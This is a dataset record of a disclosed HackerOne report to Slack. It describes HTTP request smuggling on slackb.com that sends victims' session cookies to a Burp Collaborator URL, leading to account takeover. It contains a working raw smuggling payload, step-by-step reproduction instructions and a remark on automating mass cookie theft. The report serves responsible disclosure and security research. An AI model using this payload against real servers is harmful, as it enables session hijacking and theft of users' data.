{
    "reported_to": "Slack",
    "reported_by": "defparam ",
    "title": "Mass account takeovers using HTTP Request Smuggling on https://slackb.com/ to steal session cookies",
    "content": "\nHi Slack Security Team!\nMy name is Evan and I'm a first time bug hunter to your platform :) Because you guys were running a month long bounty promotion I decided to take a little of my time and gently perform recon on your platform. Specifically the area of interest I focus in is HTTP Request Smuggling. I developed tooling to actively target some advanced HTTP Smuggling exploits and ran it on your in-scope assets. In my research I stumbled across a finding that I consider extremely critical not only for Slack but for all customers and organizations which share their privatedata/channels/conversations on Slack.\nThe bug chain is as follows:\n1) HTTP Request Smuggling CTLE to Arbitrary Request Hijacking (Poisoned Socket) on slackb.com\n2) Request Hijack forces victim HTTP requests to instead use GET https://<URL> HTTP/1.1 on slackb.com\n3) A request of GET https://<URL> HTTP/1.1 on the backend server socket results in a 301 redirect to https://<URL> with slack cookies (most importantly the d cookie)\n4) Me with my Burp Collaborator steals victims cookies by using a collaborator server as the defined <URL> in the attack\n5) Me (if I were evil) collects massive amounts of d session cookies and steals any/all possble Slack user/organization data from victim sessions\nSo let's start from the beginning. I was running smuggler -u https://slackb.com running my array of exhaustive tests when I stumbled upon a failure with test: space1 (see below)\n<image_0>\nThe space1 tests checks for HTTP desync with the following payload:\n<image_1>\nThis testcase failed on testing a CLTE and not a TECL. A CLTE is a webrequest that has both the Transfer-Encoding: chunked header (specified in some abnormal way) and the Content-Length: header. According to the RFC when both headers are specified the TE always takes priority. However, if the TE header is malformed the webrequest may get interpreted differently between the frontend and the backend server. The CLTE issue found on slackb.com is when the frontend server interprets the request sized using Content-Length and the backend server interprets the request using the Transfer-Encoding: chunked method. This causes a desync on the webrequest and can poison the backend socket causing data to be pre-pended to the next webrequest from a victim. The space1 payload places a space character in between Transfer-Encoding and the colon :. This is enough for the frontend to not understand the request as TE and instead as CE but not enough for the backend to process it in the same way.\nOne popular attack with a CLTE is to prepend data to the next request that would \"erase\" the victim's HTTP request using a custom header semantic and for the poison socket data to re-specify the HTTP method and endpoint. Here is what the payload looks like with the slackb.com attack. The best way I can explain it is through Visio using these diagrams (see below)\n<image_2>\nExplanation of the malicious request:\n<image_3>\nHere are your steps to triage:\n1) Open up a fresh Burp\n2) Open up a fresh Collaborator by going to menu: Burp->Burp Collaborator Client\n3) In the Collaborator Client click on Copy to clipboard for the server URL\n4) Go to the Repeater tab\n5) Add the following payload and replace <URL> with your collaborator URL\nCode 132 Bytes\n1GET / HTTP/1.1\n2Transfer-Encoding : chunked\n3Host: slackb.com\n4User-Agent: Smuggler/v1.0\n5Content-Length: 83\n6\n70\n8\n9GET <URL> HTTP/1.1\n10X: X\n6) Set the repeater target to: host: slackb.com , Port: 443 (SSL) by double clicking on target\n7) Press go\n8) In the Collaborator window click Poll now until you see requests\n<image_4>\n<image_5>\n<image_6>\nAt this point you just attacked an arbitrary slack customer and have access to her d session cookie.\nFrom here you can plug the session cookie into your browser and have full account takeover, Scrape all data and move onto the next victim.\nI'm happy to help if you have any further questions. Most of my requests have been made using the User-Agent: Smuggler/v1.0 header, feel free to review traffic logs keying off that.\nHave a nice day!\nBest,\nEvan\nImpact\nSo it is my opinion that this is a severe critical vulnerability that could lead to a massive data breach of a majority of customer data. With this attack it would be trivial for a bad actor to create bots that consistantly issue this attack, jump onto the victim session and steal all possible data within reach.\nI am really happy I found this for you guys so that it can be dealt with ASAP. I really hope there haven't been any attacks on customers using this vulnerability.\nBest Wishes,\nEvan\n\n",
    "severity": [
        9.3,
        null
    ],
    "bounty": null,
    "weaknesses": [
        "HTTP Request Smuggling"
    ],
    "screenshots": {
        "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/18MGYr9nAqguSUF59Y9s3RKS?response-content-disposition=attachment%3B%20filename%3D%22s1.png%22%3B%20filename%2A%3DUTF-8%27%27s1.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5SJFFD5D%2F20250326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250326T012309Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCk0LsqGROiWxyGgjK7lBBV3X20vqng%2BHb7t%2BbqaBoxDQIgOsjv5vZ67kVjqGQkh5vdNkfbL0ROL1X36MoZFBkMULcqsgUIIBADGgwwMTM2MTkyNzQ4NDkiDO0tVgatLOOxEDw5WSqPBf4Nj%2BAtsuavAQWelxJCNW72HrBA%2FtoJYgivWsBu9QYSuDg1ERA0RbU8yz2grrf8xjWs89ZZ56TT%2FMA%2BBBZrz2XL6RAUmfrb1oSzobcyqE4Yj3W4HitL67uqXtjaE2phUwGxADlT6YIZH8YpHScobFnOMqdlQ6rokXMZorRaSIQV2CyWepQ44DK30sHCgmGo2JocY9VIq3ug3qwW4JOvwREJsV8DKOFE%2B5bGNVzXnLcxzzdZ2NefuoK1UvjLwWMMzKBWYhV88TZRaez%2FhQBqeYRxAPO5GW8T1KspOL%2FDsNPNqLK9pAtMooQCUJXQi5tS5hX2EQX%2BqymjgeoK8sfCvxflXOMAM9BSOI0vkYgMJsnNFLGCYUgO14ARxBXeFk8L9Bsiu9DVdcQn19rQaSFqT1bXrltmqDWusxWg6R2cwdyy9KxmydJumU2v43p4ku8OS0onXf%2FkAn5WKX2we2D6RwkjZrfDFxJb9gWX5pfgnXyV853Itgx5Od1ly08wgbqcYo%2BjRUjDcZeJNMc81aK7raJondTPrgwT8zSKmUd%2BkuOH3pj%2FHV4Eh3TA6l8BrviUFxe7JPR544dog2avTkOXcQ0znZDsW63rez2ijpSB66cBN4RXU7J6jT2tdDUOZh9E%2Fru63zttefBBsMjQj3%2FJ1L6guXdyoJNO3fSjyrgfSg9nfYrfbGl1yp8FEoCSeUP2nL6s9IbP88JTKCdkXAN2gAwx60nbdSsJH8FXiBZzNzbbMuztj1Cg2X78q0sg9wzNhkjsvt6Hp0I1c9Rx2GiaXUC462mBULPRbVUKswDi7e7vLpPPr2XIH4%2F%2BUBtcpweBOZfjxxKJuOAKfUBCdj3RNj%2BDNFnupenA3%2FTm0eKACz0wrt6MvwY6sQHaR6Yp96XqYLPsfyViQi4tLkBuGiKPP2zO7cM4rJxIcnFbOlrabWMQMcxue0QgQDz%2Bs6oRe97NLb3nQhn1mi8vd4YpgICfU6EsyFSWTV3n6dlFj3k1ail5Ia1wobXy74e909KhgWLtG7Lr9DuSPp8YLfWik8t4FCo3p2iWFEjw1%2BmT4Tb0il2HwA%2BFkr9LgpIZG2r7smhUMAjcoWW%2BUTDLjmWkAHrJEw6hsNPoEx5rVZs%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=45bee8192d413778fd44e03231b1d85429b51e3432ea37e1d5ca4ec5968f9e5d",
        "image_1": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/WVzUzbnF5FshKewG53gwDZwY?response-content-disposition=attachment%3B%20filename%3D%22s2.png%22%3B%20filename%2A%3DUTF-8%27%27s2.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5SJFFD5D%2F20250326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250326T012309Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCk0LsqGROiWxyGgjK7lBBV3X20vqng%2BHb7t%2BbqaBoxDQIgOsjv5vZ67kVjqGQkh5vdNkfbL0ROL1X36MoZFBkMULcqsgUIIBADGgwwMTM2MTkyNzQ4NDkiDO0tVgatLOOxEDw5WSqPBf4Nj%2BAtsuavAQWelxJCNW72HrBA%2FtoJYgivWsBu9QYSuDg1ERA0RbU8yz2grrf8xjWs89ZZ56TT%2FMA%2BBBZrz2XL6RAUmfrb1oSzobcyqE4Yj3W4HitL67uqXtjaE2phUwGxADlT6YIZH8YpHScobFnOMqdlQ6rokXMZorRaSIQV2CyWepQ44DK30sHCgmGo2JocY9VIq3ug3qwW4JOvwREJsV8DKOFE%2B5bGNVzXnLcxzzdZ2NefuoK1UvjLwWMMzKBWYhV88TZRaez%2FhQBqeYRxAPO5GW8T1KspOL%2FDsNPNqLK9pAtMooQCUJXQi5tS5hX2EQX%2BqymjgeoK8sfCvxflXOMAM9BSOI0vkYgMJsnNFLGCYUgO14ARxBXeFk8L9Bsiu9DVdcQn19rQaSFqT1bXrltmqDWusxWg6R2cwdyy9KxmydJumU2v43p4ku8OS0onXf%2FkAn5WKX2we2D6RwkjZrfDFxJb9gWX5pfgnXyV853Itgx5Od1ly08wgbqcYo%2BjRUjDcZeJNMc81aK7raJondTPrgwT8zSKmUd%2BkuOH3pj%2FHV4Eh3TA6l8BrviUFxe7JPR544dog2avTkOXcQ0znZDsW63rez2ijpSB66cBN4RXU7J6jT2tdDUOZh9E%2Fru63zttefBBsMjQj3%2FJ1L6guXdyoJNO3fSjyrgfSg9nfYrfbGl1yp8FEoCSeUP2nL6s9IbP88JTKCdkXAN2gAwx60nbdSsJH8FXiBZzNzbbMuztj1Cg2X78q0sg9wzNhkjsvt6Hp0I1c9Rx2GiaXUC462mBULPRbVUKswDi7e7vLpPPr2XIH4%2F%2BUBtcpweBOZfjxxKJuOAKfUBCdj3RNj%2BDNFnupenA3%2FTm0eKACz0wrt6MvwY6sQHaR6Yp96XqYLPsfyViQi4tLkBuGiKPP2zO7cM4rJxIcnFbOlrabWMQMcxue0QgQDz%2Bs6oRe97NLb3nQhn1mi8vd4YpgICfU6EsyFSWTV3n6dlFj3k1ail5Ia1wobXy74e909KhgWLtG7Lr9DuSPp8YLfWik8t4FCo3p2iWFEjw1%2BmT4Tb0il2HwA%2BFkr9LgpIZG2r7smhUMAjcoWW%2BUTDLjmWkAHrJEw6hsNPoEx5rVZs%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c38d951bff47fcfe824a8f885c2f867fccddc8a21de00e7b937161849b5001c5",
        "image_2": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/7WA5jrCW1ujKbyJgwnXGb2Mo?response-content-disposition=attachment%3B%20filename%3D%22CLTE_explained.png%22%3B%20filename%2A%3DUTF-8%27%27CLTE_explained.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5SJFFD5D%2F20250326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250326T012309Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCk0LsqGROiWxyGgjK7lBBV3X20vqng%2BHb7t%2BbqaBoxDQIgOsjv5vZ67kVjqGQkh5vdNkfbL0ROL1X36MoZFBkMULcqsgUIIBADGgwwMTM2MTkyNzQ4NDkiDO0tVgatLOOxEDw5WSqPBf4Nj%2BAtsuavAQWelxJCNW72HrBA%2FtoJYgivWsBu9QYSuDg1ERA0RbU8yz2grrf8xjWs89ZZ56TT%2FMA%2BBBZrz2XL6RAUmfrb1oSzobcyqE4Yj3W4HitL67uqXtjaE2phUwGxADlT6YIZH8YpHScobFnOMqdlQ6rokXMZorRaSIQV2CyWepQ44DK30sHCgmGo2JocY9VIq3ug3qwW4JOvwREJsV8DKOFE%2B5bGNVzXnLcxzzdZ2NefuoK1UvjLwWMMzKBWYhV88TZRaez%2FhQBqeYRxAPO5GW8T1KspOL%2FDsNPNqLK9pAtMooQCUJXQi5tS5hX2EQX%2BqymjgeoK8sfCvxflXOMAM9BSOI0vkYgMJsnNFLGCYUgO14ARxBXeFk8L9Bsiu9DVdcQn19rQaSFqT1bXrltmqDWusxWg6R2cwdyy9KxmydJumU2v43p4ku8OS0onXf%2FkAn5WKX2we2D6RwkjZrfDFxJb9gWX5pfgnXyV853Itgx5Od1ly08wgbqcYo%2BjRUjDcZeJNMc81aK7raJondTPrgwT8zSKmUd%2BkuOH3pj%2FHV4Eh3TA6l8BrviUFxe7JPR544dog2avTkOXcQ0znZDsW63rez2ijpSB66cBN4RXU7J6jT2tdDUOZh9E%2Fru63zttefBBsMjQj3%2FJ1L6guXdyoJNO3fSjyrgfSg9nfYrfbGl1yp8FEoCSeUP2nL6s9IbP88JTKCdkXAN2gAwx60nbdSsJH8FXiBZzNzbbMuztj1Cg2X78q0sg9wzNhkjsvt6Hp0I1c9Rx2GiaXUC462mBULPRbVUKswDi7e7vLpPPr2XIH4%2F%2BUBtcpweBOZfjxxKJuOAKfUBCdj3RNj%2BDNFnupenA3%2FTm0eKACz0wrt6MvwY6sQHaR6Yp96XqYLPsfyViQi4tLkBuGiKPP2zO7cM4rJxIcnFbOlrabWMQMcxue0QgQDz%2Bs6oRe97NLb3nQhn1mi8vd4YpgICfU6EsyFSWTV3n6dlFj3k1ail5Ia1wobXy74e909KhgWLtG7Lr9DuSPp8YLfWik8t4FCo3p2iWFEjw1%2BmT4Tb0il2HwA%2BFkr9LgpIZG2r7smhUMAjcoWW%2BUTDLjmWkAHrJEw6hsNPoEx5rVZs%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=16e891ad314ff33f416855e7f3e406611a77a7bc11de8c9a6ce50e7f0b4d5867",
        "image_3": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/RT6PWXQ2fyC5K3aUmw69wRS7?response-content-disposition=attachment%3B%20filename%3D%22Redirect_Explained.png%22%3B%20filename%2A%3DUTF-8%27%27Redirect_Explained.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5SJFFD5D%2F20250326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250326T012309Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCk0LsqGROiWxyGgjK7lBBV3X20vqng%2BHb7t%2BbqaBoxDQIgOsjv5vZ67kVjqGQkh5vdNkfbL0ROL1X36MoZFBkMULcqsgUIIBADGgwwMTM2MTkyNzQ4NDkiDO0tVgatLOOxEDw5WSqPBf4Nj%2BAtsuavAQWelxJCNW72HrBA%2FtoJYgivWsBu9QYSuDg1ERA0RbU8yz2grrf8xjWs89ZZ56TT%2FMA%2BBBZrz2XL6RAUmfrb1oSzobcyqE4Yj3W4HitL67uqXtjaE2phUwGxADlT6YIZH8YpHScobFnOMqdlQ6rokXMZorRaSIQV2CyWepQ44DK30sHCgmGo2JocY9VIq3ug3qwW4JOvwREJsV8DKOFE%2B5bGNVzXnLcxzzdZ2NefuoK1UvjLwWMMzKBWYhV88TZRaez%2FhQBqeYRxAPO5GW8T1KspOL%2FDsNPNqLK9pAtMooQCUJXQi5tS5hX2EQX%2BqymjgeoK8sfCvxflXOMAM9BSOI0vkYgMJsnNFLGCYUgO14ARxBXeFk8L9Bsiu9DVdcQn19rQaSFqT1bXrltmqDWusxWg6R2cwdyy9KxmydJumU2v43p4ku8OS0onXf%2FkAn5WKX2we2D6RwkjZrfDFxJb9gWX5pfgnXyV853Itgx5Od1ly08wgbqcYo%2BjRUjDcZeJNMc81aK7raJondTPrgwT8zSKmUd%2BkuOH3pj%2FHV4Eh3TA6l8BrviUFxe7JPR544dog2avTkOXcQ0znZDsW63rez2ijpSB66cBN4RXU7J6jT2tdDUOZh9E%2Fru63zttefBBsMjQj3%2FJ1L6guXdyoJNO3fSjyrgfSg9nfYrfbGl1yp8FEoCSeUP2nL6s9IbP88JTKCdkXAN2gAwx60nbdSsJH8FXiBZzNzbbMuztj1Cg2X78q0sg9wzNhkjsvt6Hp0I1c9Rx2GiaXUC462mBULPRbVUKswDi7e7vLpPPr2XIH4%2F%2BUBtcpweBOZfjxxKJuOAKfUBCdj3RNj%2BDNFnupenA3%2FTm0eKACz0wrt6MvwY6sQHaR6Yp96XqYLPsfyViQi4tLkBuGiKPP2zO7cM4rJxIcnFbOlrabWMQMcxue0QgQDz%2Bs6oRe97NLb3nQhn1mi8vd4YpgICfU6EsyFSWTV3n6dlFj3k1ail5Ia1wobXy74e909KhgWLtG7Lr9DuSPp8YLfWik8t4FCo3p2iWFEjw1%2BmT4Tb0il2HwA%2BFkr9LgpIZG2r7smhUMAjcoWW%2BUTDLjmWkAHrJEw6hsNPoEx5rVZs%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=66866f424c06d6a1b82785179c5a94db60bc09e228564cc65c603669e94ea246",
        "image_4": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/EZAugTeu82De2t3Y5LBNLSZG?response-content-disposition=attachment%3B%20filename%3D%22burp_1.png%22%3B%20filename%2A%3DUTF-8%27%27burp_1.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5SJFFD5D%2F20250326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250326T012309Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCk0LsqGROiWxyGgjK7lBBV3X20vqng%2BHb7t%2BbqaBoxDQIgOsjv5vZ67kVjqGQkh5vdNkfbL0ROL1X36MoZFBkMULcqsgUIIBADGgwwMTM2MTkyNzQ4NDkiDO0tVgatLOOxEDw5WSqPBf4Nj%2BAtsuavAQWelxJCNW72HrBA%2FtoJYgivWsBu9QYSuDg1ERA0RbU8yz2grrf8xjWs89ZZ56TT%2FMA%2BBBZrz2XL6RAUmfrb1oSzobcyqE4Yj3W4HitL67uqXtjaE2phUwGxADlT6YIZH8YpHScobFnOMqdlQ6rokXMZorRaSIQV2CyWepQ44DK30sHCgmGo2JocY9VIq3ug3qwW4JOvwREJsV8DKOFE%2B5bGNVzXnLcxzzdZ2NefuoK1UvjLwWMMzKBWYhV88TZRaez%2FhQBqeYRxAPO5GW8T1KspOL%2FDsNPNqLK9pAtMooQCUJXQi5tS5hX2EQX%2BqymjgeoK8sfCvxflXOMAM9BSOI0vkYgMJsnNFLGCYUgO14ARxBXeFk8L9Bsiu9DVdcQn19rQaSFqT1bXrltmqDWusxWg6R2cwdyy9KxmydJumU2v43p4ku8OS0onXf%2FkAn5WKX2we2D6RwkjZrfDFxJb9gWX5pfgnXyV853Itgx5Od1ly08wgbqcYo%2BjRUjDcZeJNMc81aK7raJondTPrgwT8zSKmUd%2BkuOH3pj%2FHV4Eh3TA6l8BrviUFxe7JPR544dog2avTkOXcQ0znZDsW63rez2ijpSB66cBN4RXU7J6jT2tdDUOZh9E%2Fru63zttefBBsMjQj3%2FJ1L6guXdyoJNO3fSjyrgfSg9nfYrfbGl1yp8FEoCSeUP2nL6s9IbP88JTKCdkXAN2gAwx60nbdSsJH8FXiBZzNzbbMuztj1Cg2X78q0sg9wzNhkjsvt6Hp0I1c9Rx2GiaXUC462mBULPRbVUKswDi7e7vLpPPr2XIH4%2F%2BUBtcpweBOZfjxxKJuOAKfUBCdj3RNj%2BDNFnupenA3%2FTm0eKACz0wrt6MvwY6sQHaR6Yp96XqYLPsfyViQi4tLkBuGiKPP2zO7cM4rJxIcnFbOlrabWMQMcxue0QgQDz%2Bs6oRe97NLb3nQhn1mi8vd4YpgICfU6EsyFSWTV3n6dlFj3k1ail5Ia1wobXy74e909KhgWLtG7Lr9DuSPp8YLfWik8t4FCo3p2iWFEjw1%2BmT4Tb0il2HwA%2BFkr9LgpIZG2r7smhUMAjcoWW%2BUTDLjmWkAHrJEw6hsNPoEx5rVZs%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a5b2fcfd01e67d456916d57ea1d152559a05f1430cd758187c2d7a4f32d4fb95",
        "image_5": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/gFpsAzo6xeV8pbnN715ymr5c?response-content-disposition=attachment%3B%20filename%3D%22collab_1.png%22%3B%20filename%2A%3DUTF-8%27%27collab_1.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5SJFFD5D%2F20250326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250326T012309Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCk0LsqGROiWxyGgjK7lBBV3X20vqng%2BHb7t%2BbqaBoxDQIgOsjv5vZ67kVjqGQkh5vdNkfbL0ROL1X36MoZFBkMULcqsgUIIBADGgwwMTM2MTkyNzQ4NDkiDO0tVgatLOOxEDw5WSqPBf4Nj%2BAtsuavAQWelxJCNW72HrBA%2FtoJYgivWsBu9QYSuDg1ERA0RbU8yz2grrf8xjWs89ZZ56TT%2FMA%2BBBZrz2XL6RAUmfrb1oSzobcyqE4Yj3W4HitL67uqXtjaE2phUwGxADlT6YIZH8YpHScobFnOMqdlQ6rokXMZorRaSIQV2CyWepQ44DK30sHCgmGo2JocY9VIq3ug3qwW4JOvwREJsV8DKOFE%2B5bGNVzXnLcxzzdZ2NefuoK1UvjLwWMMzKBWYhV88TZRaez%2FhQBqeYRxAPO5GW8T1KspOL%2FDsNPNqLK9pAtMooQCUJXQi5tS5hX2EQX%2BqymjgeoK8sfCvxflXOMAM9BSOI0vkYgMJsnNFLGCYUgO14ARxBXeFk8L9Bsiu9DVdcQn19rQaSFqT1bXrltmqDWusxWg6R2cwdyy9KxmydJumU2v43p4ku8OS0onXf%2FkAn5WKX2we2D6RwkjZrfDFxJb9gWX5pfgnXyV853Itgx5Od1ly08wgbqcYo%2BjRUjDcZeJNMc81aK7raJondTPrgwT8zSKmUd%2BkuOH3pj%2FHV4Eh3TA6l8BrviUFxe7JPR544dog2avTkOXcQ0znZDsW63rez2ijpSB66cBN4RXU7J6jT2tdDUOZh9E%2Fru63zttefBBsMjQj3%2FJ1L6guXdyoJNO3fSjyrgfSg9nfYrfbGl1yp8FEoCSeUP2nL6s9IbP88JTKCdkXAN2gAwx60nbdSsJH8FXiBZzNzbbMuztj1Cg2X78q0sg9wzNhkjsvt6Hp0I1c9Rx2GiaXUC462mBULPRbVUKswDi7e7vLpPPr2XIH4%2F%2BUBtcpweBOZfjxxKJuOAKfUBCdj3RNj%2BDNFnupenA3%2FTm0eKACz0wrt6MvwY6sQHaR6Yp96XqYLPsfyViQi4tLkBuGiKPP2zO7cM4rJxIcnFbOlrabWMQMcxue0QgQDz%2Bs6oRe97NLb3nQhn1mi8vd4YpgICfU6EsyFSWTV3n6dlFj3k1ail5Ia1wobXy74e909KhgWLtG7Lr9DuSPp8YLfWik8t4FCo3p2iWFEjw1%2BmT4Tb0il2HwA%2BFkr9LgpIZG2r7smhUMAjcoWW%2BUTDLjmWkAHrJEw6hsNPoEx5rVZs%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1d4a36583d311570dcc78731b08404c85d40933b2efba768a88e51d9c42f815f",
        "image_6": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/EAvaV1kCGL2FaSnCjWsCxmBW?response-content-disposition=attachment%3B%20filename%3D%22collab_2.png%22%3B%20filename%2A%3DUTF-8%27%27collab_2.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5SJFFD5D%2F20250326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250326T012309Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCk0LsqGROiWxyGgjK7lBBV3X20vqng%2BHb7t%2BbqaBoxDQIgOsjv5vZ67kVjqGQkh5vdNkfbL0ROL1X36MoZFBkMULcqsgUIIBADGgwwMTM2MTkyNzQ4NDkiDO0tVgatLOOxEDw5WSqPBf4Nj%2BAtsuavAQWelxJCNW72HrBA%2FtoJYgivWsBu9QYSuDg1ERA0RbU8yz2grrf8xjWs89ZZ56TT%2FMA%2BBBZrz2XL6RAUmfrb1oSzobcyqE4Yj3W4HitL67uqXtjaE2phUwGxADlT6YIZH8YpHScobFnOMqdlQ6rokXMZorRaSIQV2CyWepQ44DK30sHCgmGo2JocY9VIq3ug3qwW4JOvwREJsV8DKOFE%2B5bGNVzXnLcxzzdZ2NefuoK1UvjLwWMMzKBWYhV88TZRaez%2FhQBqeYRxAPO5GW8T1KspOL%2FDsNPNqLK9pAtMooQCUJXQi5tS5hX2EQX%2BqymjgeoK8sfCvxflXOMAM9BSOI0vkYgMJsnNFLGCYUgO14ARxBXeFk8L9Bsiu9DVdcQn19rQaSFqT1bXrltmqDWusxWg6R2cwdyy9KxmydJumU2v43p4ku8OS0onXf%2FkAn5WKX2we2D6RwkjZrfDFxJb9gWX5pfgnXyV853Itgx5Od1ly08wgbqcYo%2BjRUjDcZeJNMc81aK7raJondTPrgwT8zSKmUd%2BkuOH3pj%2FHV4Eh3TA6l8BrviUFxe7JPR544dog2avTkOXcQ0znZDsW63rez2ijpSB66cBN4RXU7J6jT2tdDUOZh9E%2Fru63zttefBBsMjQj3%2FJ1L6guXdyoJNO3fSjyrgfSg9nfYrfbGl1yp8FEoCSeUP2nL6s9IbP88JTKCdkXAN2gAwx60nbdSsJH8FXiBZzNzbbMuztj1Cg2X78q0sg9wzNhkjsvt6Hp0I1c9Rx2GiaXUC462mBULPRbVUKswDi7e7vLpPPr2XIH4%2F%2BUBtcpweBOZfjxxKJuOAKfUBCdj3RNj%2BDNFnupenA3%2FTm0eKACz0wrt6MvwY6sQHaR6Yp96XqYLPsfyViQi4tLkBuGiKPP2zO7cM4rJxIcnFbOlrabWMQMcxue0QgQDz%2Bs6oRe97NLb3nQhn1mi8vd4YpgICfU6EsyFSWTV3n6dlFj3k1ail5Ia1wobXy74e909KhgWLtG7Lr9DuSPp8YLfWik8t4FCo3p2iWFEjw1%2BmT4Tb0il2HwA%2BFkr9LgpIZG2r7smhUMAjcoWW%2BUTDLjmWkAHrJEw6hsNPoEx5rVZs%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c44aebe30f111ff7acf15ded658bfe3e3c82ab7b7a2bca3208858c89b0a1b905"
    },
    "disclosed_date": 1583987340,
    "report_url": "https://hackerone.com/reports/737140",
    "is_multi_component": true,
    "complexity": "HIGH",
    "novelty": "HIGH",
    "vuln_category": "WEB_APP",
    "steps": [
        [
            1,
            "Open Burp Suite and create a new Burp Collaborator client to generate a unique URL."
        ],
        [
            2,
            "In Burp Repeater, construct a malicious HTTP request with both Transfer-Encoding: chunked (with a space before the colon) and Content-Length headers, and include a GET request to the Collaborator URL in the payload."
        ],
        [
            3,
            "Send the crafted request to https://slackb.com and monitor the Collaborator client for incoming requests containing session cookies."
        ],
        [
            4,
            "Use the stolen session cookies to hijack user sessions and access sensitive data."
        ]
    ],
    "vuln_description": "The vulnerability involves HTTP Request Smuggling on slackb.com, where a desync between frontend and backend servers allows an attacker to poison backend sockets and hijack victim requests. This leads to the theft of session cookies (especially the 'd' cookie), enabling full account takeover and access to sensitive Slack data.",
    "reason": "This attack requires deep understanding of HTTP protocol nuances, particularly how different servers interpret malformed headers (CLTE desync). The attacker must craft a precise payload that exploits subtle parsing differences between frontend and backend systems, and understand how to chain this with session hijacking via cookie theft. The attack also involves non-obvious interactions between header parsing, socket poisoning, and redirect behaviors.",
    "new_complexity": "HIGH",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null
}